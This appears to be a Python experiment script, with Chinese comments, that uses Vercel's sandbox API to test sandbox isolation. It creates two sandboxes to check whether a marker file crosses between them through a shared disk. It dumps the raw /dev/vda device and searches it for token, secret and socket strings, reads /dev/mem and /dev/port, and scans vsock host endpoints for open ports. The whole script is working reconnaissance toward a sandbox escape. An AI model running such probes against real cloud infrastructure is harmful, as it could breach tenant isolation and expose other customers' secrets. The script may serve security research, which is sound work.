# 实验J20: 跨沙箱共享盘验证(vda) + vsock 修正探测 + /dev/mem /dev/port
# J19: /dev/vda 可读(共享盘: hosts/share/ca) + dmesg 泄露 cell 架构
# 目标: 1)沙箱A写 /run/vercel/share/marker, 沙箱B能否看到(共享盘?)
#       2)vsock 探测(修正执行方式) 3)/dev/mem 读 4)/dev/port 读 5)vda 全盘 strings
import json, base64, pathlib, time, urllib.request, urllib.error

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=120):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=120):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

def create_sandbox(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name,
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    print(f"create {name}: {c}", flush=True)
    return json.loads(r)["sandbox"]["currentSessionId"]

# ---------- 沙箱 A: 写 marker 并常驻 ----------
sidA = create_sandbox("expj20a")
MARKER = f"MARKER_A_{int(time.time())}"
run_cmd(sidA,
        f"import subprocess;print(subprocess.run(['bash','-c','echo {MARKER} > /run/vercel/share/marker_test; ls -la /run/vercel/share/; hostname'],capture_output=True,text=True).stdout)",
        "A-write-marker", wait=True, timeout=30000)
print(f">>> A marker: {MARKER}", flush=True)

# ---------- 沙箱 B: 检查 marker + 侦察 ----------
sidB = create_sandbox("expj20b")
time.sleep(2)
RECON = r'''
import os, subprocess
print("=== share 目录(marker 检查) ===")
print(subprocess.run(["bash","-c","ls -la /run/vercel/share/; cat /run/vercel/share/marker_test 2>&1"],capture_output=True,text=True).stdout)
print("=== hostname ===")
print(open("/proc/sys/kernel/hostname").read())
print("=== /sys/block ===")
for b in ["vda","vdb"]:
    try:
        with open(f"/sys/block/{b}/size") as f: size = int(f.read())*512
        print(b, "size:", size, size//1024//1024, "MB")
    except Exception as e: print(b, "ERR", e)
print("=== vda strings 前16MB 找特征 ===")
try:
    with open("/dev/vda","rb") as f:
        data = f.read(16*1024*1024)
    import re
    hits = set()
    for m in re.finditer(rb"[\x20-\x7e]{8,}", data):
        t = m.group(0).decode(errors="replace")
        if re.search(r"hvc_|cell|vercel|hosts|share|sandbox|celld|\.sock|token|secret|vdb|mnt/drives|resolv", t, re.I):
            hits.add(t[:120])
    for h in sorted(hits)[:50]:
        print("STR:", h)
except Exception as e:
    print("vda read ERR", type(e).__name__, e)
print("=== /dev/mem 探测 ===")
try:
    with open("/dev/mem","rb") as f:
        d0 = f.read(64)
        print("mem[0]:", d0.hex())
except Exception as e:
    print("mem ERR", type(e).__name__, e)
print("=== /dev/port 探测(CMOS 0x70-0x74) ===")
try:
    with open("/dev/port","rb",buffering=0) as f:
        import os as _os
        for off in (0x70, 0x71, 0x72, 0x73, 0x74, 0x80):
            f.seek(off)
            print(f"port[0x{off:x}]:", f.read(1).hex())
except Exception as e:
    print("port ERR", type(e).__name__, e)
'''
run_cmd(sidB, RECON, "B-recon", wait=True, timeout=120000)

# vsock 探测(修正: 脚本文件方式)
VSOCK = r'''
import socket
for cid in (2, 3):
    for port in (22, 80, 443, 2375, 5000, 8000, 8080, 8888, 9000, 3000, 10000, 9999):
        try:
            s = socket.socket(40, socket.SOCK_STREAM)
            s.settimeout(1.0)
            r = s.connect_ex((cid, port))
            if r == 0:
                print("VSOCK OPEN", cid, port, flush=True)
            s.close()
        except Exception as e:
            print("VSOCK ERR", cid, port, type(e).__name__, flush=True)
print("vsock probe done", flush=True)
'''
run_cmd(sidB, VSOCK, "B-vsock", wait=True, timeout=60000)

api("DELETE", f"/v2/sandboxes/expj20b?teamId={TEAM}&projectId={PROJ}")
api("DELETE", f"/v2/sandboxes/expj20a?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
